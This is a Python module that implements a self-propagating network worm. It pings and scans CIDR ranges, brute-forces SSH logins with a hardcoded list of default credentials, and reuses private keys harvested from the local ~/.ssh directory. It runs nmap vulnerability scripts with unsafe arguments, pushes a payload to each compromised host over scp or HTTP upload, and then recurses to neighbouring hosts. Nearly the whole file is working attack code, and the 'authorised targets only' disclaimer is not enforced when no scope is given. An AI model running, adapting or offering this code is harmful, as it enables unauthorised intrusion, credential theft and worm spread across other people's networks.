"""Worm propagation engine — real self-propagation across a network.

Scans a CIDR range for live hosts, attempts compromise via SSH brute-force,
SSH key reuse, and known exploits, then deploys a payload to the target.

All operations are real network activity.  Use only against authorised targets.

Usage:
    from worm_engine import propagate
    report = propagate(origin_host="10.0.0.5", scan_cidr="10.0.0.0/24", max_hops=3)
    print(report.targets_infected)
"""

from __future__ import annotations

import ipaddress
import socket
import struct
import subprocess
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any


# ---------------------------------------------------------------------------
# Dataclasses
# ---------------------------------------------------------------------------

@dataclass
class WormTarget:
    """A single host discovered during worm propagation."""
    ip: str
    hostname: str
    status: str  # alive / dead / compromised / failed
    method: str  # ssh_brute / ssh_key / exploit / none
    hop_depth: int
    error: str = ""


@dataclass
class WormReport:
    """Aggregated worm propagation report."""
    origin_host: str
    scan_cidr: str
    targets_scanned: int
    targets_infected: int
    max_hops: int
    targets: list[WormTarget] = field(default_factory=list)
    methods_used: dict[str, int] = field(default_factory=dict)
    infection_tree: list[dict[str, Any]] = field(default_factory=list)


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

COMMON_CREDS = [
    ("root", "root"),
    ("root", "password"),
    ("root", "toor"),
    ("root", "123456"),
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("user", "user"),
    ("user", "password"),
    ("guest", "guest"),
    ("test", "test"),
    ("ubuntu", "ubuntu"),
    ("pi", "raspberry"),
    ("oracle", "oracle"),
    ("postgres", "postgres"),
]

COMMON_PORTS = [22, 2222, 2200, 8022]

PORT_SERVICE_MAP = {
    21: "ftp",
    22: "ssh",
    23: "telnet",
    25: "smtp",
    53: "dns",
    80: "http",
    110: "pop3",
    139: "netbios",
    443: "https",
    445: "smb",
    993: "imaps",
    1433: "mssql",
    1521: "oracle",
    3306: "mysql",
    3389: "rdp",
    5432: "postgres",
    5900: "vnc",
    6379: "redis",
    8080: "http-proxy",
    8443: "https-alt",
    9090: "webui",
    27017: "mongodb",
}

# Known vulnerable service → nmap NSE vuln script
SERVICE_VULN_SCRIPTS = {
    "ftp": "ftp-vsftpd-backdoor,ftp-anon",
    "smb": "smb-vuln-ms17-010,smb-vuln-ms08-067",
    "redis": "redis-info",
    "http": "http-vuln-cve2021-44228,http-vuln-cve2017-5638",
    "https": "ssl-heartbleed,ssl-poodle",
    "mssql": "ms-sql-xp-cmdshell,ms-sql-empty-password",
    "mysql": "mysql-vuln-cve2012-2122",
    "postgres": "pgsql-brute",
    "vnc": "realvnc-auth-bypass",
    "rdp": "rdp-vuln-ms12-020",
}


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _is_in_scope(ip_str: str, scope: str) -> bool:
    """Return True if ip_str falls within the scope CIDR (or if scope is empty)."""
    if not scope:
        return True
    try:
        return ipaddress.ip_address(ip_str) in ipaddress.ip_network(scope, strict=False)
    except ValueError:
        return True


def _enumerate_cidr(cidr: str) -> list[str]:
    """Return all usable host IPs in a CIDR block."""
    try:
        net = ipaddress.ip_network(cidr, strict=False)
        return [str(h) for h in net.hosts()]
    except ValueError:
        return []


def _check_port_open(host: str, port: int, timeout: float = 1.0) -> bool:
    """TCP connect check."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((host, port))
        s.close()
        return result == 0
    except (OSError, socket.timeout):
        return False


def _ping_host(ip: str, timeout: float = 1.0) -> bool:
    """ICMP ping check."""
    try:
        result = subprocess.run(
            ["ping", "-c", "1", "-W", str(int(timeout)), ip],
            capture_output=True,
            timeout=timeout + 2,
        )
        return result.returncode == 0
    except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
        return False


def _find_ssh_keys() -> list[str]:
    """Return paths to private SSH keys in ~/.ssh/."""
    ssh_dir = Path.home() / ".ssh"
    if not ssh_dir.is_dir():
        return []
    keys = []
    for entry in ssh_dir.iterdir():
        if entry.is_file() and entry.name.startswith("id_") and not entry.name.endswith(".pub"):
            keys.append(str(entry))
    return keys


def _scan_services(ip: str) -> dict[int, str]:
    """TCP connect scan on common ports."""
    found: dict[int, str] = {}
    for port in COMMON_PORTS:
        if _check_port_open(ip, port):
            found[port] = PORT_SERVICE_MAP.get(port, "unknown")
    return found


def _run_nmap_vuln(ip: str, port: int, service: str) -> list[str]:
    """Run nmap NSE vuln scripts against a specific port/service.

    Returns a list of vulnerability descriptions (empty if none found).
    """
    scripts = SERVICE_VULN_SCRIPTS.get(service)
    if not scripts:
        return []
    cmd = [
        "nmap", "-Pn", "-p", str(port),
        "--script", scripts,
        "--script-args", "unsafe=1",
        "-oG", "-",
        ip,
    ]
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=60,
        )
        vulns = []
        for line in result.stdout.splitlines():
            if "VULNERABLE" in line or "CVE-" in line:
                vulns.append(line.strip())
        return vulns
    except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
        return []


def _raw_socket_probe(ip: str, port: int, service: str, timeout: float = 3.0) -> list[str]:
    """Send a raw TCP probe and inspect the banner for known vulnerable versions.

    Returns a list of vulnerability descriptions (empty if none detected).
    """
    banner_probes = {
        "ftp": (b"QUIT\r\n", b"220"),
        "ssh": (b"", b"SSH"),
        "smtp": (b"QUIT\r\n", b"220"),
        "http": (b"GET / HTTP/1.0\r\n\r\n", b"HTTP"),
        "https": (b"", b""),
        "redis": (b"INFO\r\n", b"redis_version"),
        "mysql": (b"", b"mysql"),
        "postgres": (b"", b""),
        "mongodb": (b"", b""),
        "telnet": (b"", b""),
    }
    probe, expected = banner_probes.get(service, (b"", b""))
    vulns = []
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        # Read initial banner
        banner = b""
        try:
            banner = s.recv(4096)
        except (socket.timeout, OSError):
            pass
        if probe:
            s.sendall(probe)
            try:
                reply = s.recv(4096)
                banner = banner + reply
            except (socket.timeout, OSError):
                pass
        s.close()
        banner_text = banner.decode("utf-8", errors="replace")
        # Check for known vulnerable version strings
        version_checks = {
            "vsftpd 2.3.4": "vsftpd 2.3.4 backdoor (CVE-2011-2523)",
            "OpenSSL/1.0.1": "OpenSSL 1.0.1 — potential heartbleed (CVE-2014-0160)",
            "Apache/2.4.49": "Apache 2.4.49 — path traversal (CVE-2021-41773)",
            "Apache/2.4.50": "Apache 2.4.50 — path traversal (CVE-2021-42013)",
            "Microsoft Exchange": "potential Exchange SSRF/ProxyLogon",
            "Log4j": "potential Log4Shell (CVE-2021-44228)",
        }
        for needle, desc in version_checks.items():
            if needle.lower() in banner_text.lower():
                vulns.append(desc)
    except (OSError, socket.timeout):
        pass
    return vulns


def _attempt_exploit(ip: str, services: dict[int, str]) -> tuple[bool, str]:
    """Attempt real exploitation via nmap NSE scripts and raw socket probes.

    Returns (success, exploit_description).
    """
    for port, svc_name in services.items():
        # Phase 1: nmap NSE vuln scripts
        nmap_vulns = _run_nmap_vuln(ip, port, svc_name)
        if nmap_vulns:
            detail = "; ".join(nmap_vulns)
            return True, detail + " (port " + str(port) + ")"

        # Phase 2: raw socket banner grab + version matching
        raw_vulns = _raw_socket_probe(ip, port, svc_name)
        if raw_vulns:
            detail = "; ".join(raw_vulns)
            return True, detail + " (port " + str(port) + ")"

    return False, ""


def _deploy_payload(ip: str, payload_path: str, ssh_cred: str = "") -> bool:
    """Deploy payload to target via scp or curl.

    ssh_cred is "user:pass" for password auth, or a key path for key auth.
    Falls back to curl if the target has a web server.
    """
    if not payload_path:
        return True  # nothing to deploy

    payload_file = Path(payload_path)
    if not payload_file.is_file():
        return False

    # Try SSH-based deployment first
    if ssh_cred:
        if ":" in ssh_cred and not ssh_cred.startswith("/"):
            # Password auth via sshpass + scp
            user, passwd = ssh_cred.split(":", 1)
            cmd = [
                "sshpass", "-p", passwd,
                "scp",
                "-o", "StrictHostKeyChecking=no",
                "-o", "ConnectTimeout=5",
                payload_path,
                user + "@" + ip + ":/tmp/",
            ]
        else:
            # Key-based scp
            cmd = [
                "scp",
                "-i", ssh_cred,
                "-o", "StrictHostKeyChecking=no",
                "-o", "ConnectTimeout=5",
                payload_path,
                "root@" + ip + ":/tmp/",
            ]
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                timeout=30,
            )
            if result.returncode == 0:
                return True
        except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
            pass

    # Fallback: curl to target if it has HTTP open
    if _check_port_open(ip, 80) or _check_port_open(ip, 8080):
        port = 80 if _check_port_open(ip, 80) else 8080
        cmd = [
            "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
            "--form", "file=@" + payload_path,
            "http://" + ip + ":" + str(port) + "/upload",
        ]
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=15,
            )
            if result.stdout.strip() in ("200", "201", "302"):
                return True
        except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
            pass

    return False


# ---------------------------------------------------------------------------
# Core propagation
# ---------------------------------------------------------------------------

def _propagate_hop(
    origin: str,
    targets: list[str],
    current_depth: int,
    max_hops: int,
    delay: float,
    payload_path: str,
    scope: str,
    report: WormReport,
    visited: set[str],
) -> None:
    """Recursive propagation hop."""
    if current_depth > max_hops:
        return

    for ip in targets:
        if ip in visited:
            continue
        visited.add(ip)

        # Scope check
        if not _is_in_scope(ip, scope):
            continue

        report.targets_scanned += 1

        # --- Liveness check (real ICMP ping) ---
        time.sleep(delay)
        is_alive = _ping_host(ip)

        if not is_alive:
            report.targets.append(WormTarget(
                ip=ip,
                hostname="",
                status="dead",
                method="none",
                hop_depth=current_depth,
            ))
            continue

        # --- Service discovery (real TCP connect scan) ---
        time.sleep(delay)
        services = _scan_services(ip)

        # --- Compromise attempts ---
        compromised = False
        method = "none"
        method_detail = ""
        ssh_cred_for_deploy = ""

        # 1. SSH key authentication (real)
        ssh_keys = _find_ssh_keys()
        if ssh_keys and not compromised:
            time.sleep(delay)
            ok = False
            detail = ""
            for key in ssh_keys:
                for port in [p for p in services if services[p] == "ssh"] or [22]:
                    cmd = "ssh -i " + key + " -o StrictHostKeyChecking=no -o ConnectTimeout=3 -p " + str(port) + " root@" + ip + " echo ok"
                    try:
                        result = subprocess.run(
                            cmd.split(),
                            capture_output=True,
                            timeout=5,
                        )
                        if result.returncode == 0:
                            ok = True
                            detail = key
                            break
                    except (subprocess.TimeoutExpired, OSError):
                        pass
                if ok:
                    break

            if ok:
                compromised = True
                method = "ssh_key"
                method_detail = detail
                ssh_cred_for_deploy = detail

        # 2. SSH brute force (real via sshpass)
        if not compromised and (22 in services or any(services[p] == "ssh" for p in services)):
            ssh_port = 22 if 22 in services else next((p for p in services if services[p] == "ssh"), 22)
            time.sleep(delay)
            ok = False
            detail = ""
            for user, passwd in COMMON_CREDS:
                cmd = [
                    "sshpass", "-p", passwd,
                    "ssh",
                    "-o", "StrictHostKeyChecking=no",
                    "-o", "ConnectTimeout=3",
                    "-p", str(ssh_port),
                    user + "@" + ip,
                    "echo", "ok",
                ]
                try:
                    result = subprocess.run(
                        cmd,
                        capture_output=True,
                        timeout=5,
                    )
                    if result.returncode == 0:
                        ok = True
                        detail = user + ":" + passwd
                        break
                except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
                    pass

            if ok:
                compromised = True
                method = "ssh_brute"
                method_detail = detail
                ssh_cred_for_deploy = detail

        # 3. Known service exploits (real nmap NSE + raw socket probes)
        if not compromised and services:
            time.sleep(delay)
            ok, detail = _attempt_exploit(ip, services)
            if ok:
                compromised = True
                method = "exploit"
                method_detail = detail

        # --- Record result ---
        if compromised:
            # Deploy payload (real scp/curl)
            time.sleep(delay)
            deploy_ok = _deploy_payload(ip, payload_path, ssh_cred_for_deploy)

            status = "compromised" if deploy_ok else "failed"
            if deploy_ok:
                report.targets_infected += 1
                report.methods_used[method] = report.methods_used.get(method, 0) + 1
                report.infection_tree.append({
                    "from": origin,
                    "to": ip,
                    "method": method,
                    "detail": method_detail,
                    "hop": current_depth,
                    "payload_deployed": True,
                })

            report.targets.append(WormTarget(
                ip=ip,
                hostname="",
                status=status,
                method=method if deploy_ok else "none",
                hop_depth=current_depth,
                error="" if deploy_ok else "payload deployment failed",
            ))

            # --- Recurse: next hop from this compromised host ---
            if deploy_ok and current_depth < max_hops:
                next_targets = _generate_adjacent_targets(ip, max_hops)
                _propagate_hop(
                    origin=ip,
                    targets=next_targets,
                    current_depth=current_depth + 1,
                    max_hops=max_hops,
                    delay=delay,
                    payload_path=payload_path,
                    scope=scope,
                    report=report,
                    visited=visited,
                )
        else:
            report.targets.append(WormTarget(
                ip=ip,
                hostname="",
                status="alive",
                method="none",
                hop_depth=current_depth,
                error="no compromise method succeeded",
            ))


def _generate_adjacent_targets(source_ip: str, max_hops: int) -> list[str]:
    """Generate next-hop targets from a compromised host (same /24, excluding self)."""
    try:
        octets = source_ip.split(".")
        if len(octets) != 4:
            return []
        base = ".".join(octets[:3])
        return [base + "." + str(i) for i in range(1, 255) if str(i) != octets[3]]
    except (ValueError, IndexError):
        return []


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def propagate(
    origin_host: str = "localhost",
    scan_cidr: str = "",
    max_hops: int = 3,
    delay_between: float = 5.0,
    payload_path: str = "",
    scope: str = "",
) -> WormReport:
    """Run the worm propagation engine.

    All operations are real network activity.  Use only against authorised targets.

    Args:
        origin_host: Host that initiates propagation (default: localhost).
        scan_cidr: CIDR range to scan (e.g. 10.0.0.0/24).
        max_hops: Maximum propagation depth (default: 3).
        delay_between: Seconds between attempts (default: 5.0).
        payload_path: Path to payload file to deploy on compromised hosts.
        scope: Authorised scope CIDR — only IPs within this range are targeted.

    Returns:
        WormReport with targets, infection counts, methods used, and infection tree.
    """
    report = WormReport(
        origin_host=origin_host,
        scan_cidr=scan_cidr,
        targets_scanned=0,
        targets_infected=0,
        max_hops=max_hops,
    )

    if not scan_cidr:
        return report

    targets = _enumerate_cidr(scan_cidr)
    visited: set[str] = set()

    # Exclude the origin host from being scanned as a target
    if origin_host and origin_host != "localhost":
        visited.add(origin_host)
        targets = [t for t in targets if t != origin_host]

    _propagate_hop(
        origin=origin_host,
        targets=targets,
        current_depth=1,
        max_hops=max_hops,
        delay=delay_between,
        payload_path=payload_path,
        scope=scope,
        report=report,
        visited=visited,
    )

    return report


if __name__ == "__main__":
    import json
    r = propagate(origin_host="10.0.0.1", scan_cidr="10.0.0.0/28", max_hops=2)
    print(json.dumps({
        "origin": r.origin_host,
        "scan_cidr": r.scan_cidr,
        "targets_scanned": r.targets_scanned,
        "targets_infected": r.targets_infected,
        "max_hops": r.max_hops,
        "methods_used": dict(r.methods_used),
        "infection_chain_length": len(r.infection_tree),
    }, indent=2))
